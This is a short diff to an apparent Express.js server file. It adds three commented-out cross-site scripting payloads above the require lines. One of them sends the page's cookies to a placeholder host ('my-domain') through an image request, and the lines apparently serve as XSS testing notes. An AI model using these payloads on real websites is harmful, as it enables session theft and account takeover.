@@ -1,3 +1,7 @@
+// <script>alert(1)</script>
+// <script>alert(document.cookie)</script>
+// <script>new Image().src = 'http://my-domain/?cookie=' + encodeURIComponent(document.cookie);</script> 
+
 const express = require('express');
 const path = require('path');
 
